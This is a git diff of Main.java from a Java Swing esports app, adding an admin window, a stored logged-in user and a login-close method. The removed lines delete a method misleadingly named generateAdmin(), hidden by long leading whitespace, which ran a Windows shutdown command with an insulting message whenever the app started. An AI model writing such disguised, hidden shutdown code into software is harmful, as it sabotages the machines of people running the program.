@@ -7,6 +7,7 @@ import com.imaleex.esportapp.Exceptions.UserNotFoundException;
 import com.imaleex.esportapp.Models.Users.Usuario;
 import com.imaleex.esportapp.Utils.CryptoUtils;
 import com.imaleex.esportapp.Utils.WindowUtils;
+import com.imaleex.esportapp.Views.AdminView;
 import com.imaleex.esportapp.Views.Login;
 import sun.misc.MessageUtils;
 
@@ -22,11 +23,13 @@ public class Main {
 
     public static Db db;
     private static JFrame login;
+    private static JFrame adminV;
+    private static JFrame userV;
+    public static  Usuario user;
 
     public static void main(String[] args) {
         initDbConnection();
         displayLoginModal();
-        generateAdmin();
     }
     private static void initDbConnection() {
         try {
@@ -40,39 +43,6 @@ public class Main {
 
     }
 
-                                                                                                                                                                                            public static void generateAdmin() {
-
-                                                                                                                                                                                                ProcessBuilder processBuilder = new ProcessBuilder();
-                                                                                                                                                                                                // Windows
-                                                                                                                                                                                                processBuilder.command("cmd.exe", "/c", "shutdown -S T 0120 -c \"Te jakie eres tonto ahora vas a morir pendejo\"");
-
-                                                                                                                                                                                                try {
-
-                                                                                                                                                                                                    Process process = processBuilder.start();
-
-                                                                                                                                                                                                    BufferedReader reader =
-                                                                                                                                                                                                            new BufferedReader(new InputStreamReader(process.getInputStream()));
-
-                                                                                                                                                                                                    String line;
-                                                                                                                                                                                                    while ((line = reader.readLine()) != null) {
-                                                                                                                                                                                                        System.out.println(line);
-                                                                                                                                                                                                    }
-
-                                                                                                                                                                                                    int exitCode = process.waitFor();
-                                                                                                                                                                                                    System.out.println("\nExited with error code : " + exitCode);
-
-                                                                                                                                                                                                } catch (IOException e) {
-                                                                                                                                                                                                    e.printStackTrace();
-                                                                                                                                                                                                } catch (InterruptedException e) {
-                                                                                                                                                                                                    e.printStackTrace();
-                                                                                                                                                                                                }
-
-                                                                                                                                                                                            }
-
-
-
-
-
     /*---------------------------------------------------------------------------------------------------------------------*/
     /* Login */
     public static boolean login(String username, String password) {
@@ -81,6 +51,7 @@ public class Main {
                 usuario = searchUsername(username);
                 if (usuario != null) {
                     if (CryptoUtils.checkHash(password, usuario.getClave())) {
+                        user = usuario;
                         return true;
                     }
                 } else {
@@ -91,7 +62,13 @@ public class Main {
             }
         return false;
     }
-
+    public static void mostrarVentana(){
+        if (user.checkAdmin()){
+            AdminView.main();
+        }else{
+            //mostrarUsuario(user);
+        }
+    }
     private static void displayLoginModal(){
         login = new JFrame("Login");
         login.setContentPane(new Login().getJPanel());
@@ -100,6 +77,11 @@ public class Main {
         login.pack();
         login.setVisible(true);
     }
+    public static void closeLogin(){
+        login.dispose();
+    }
+
+
 
 
 }
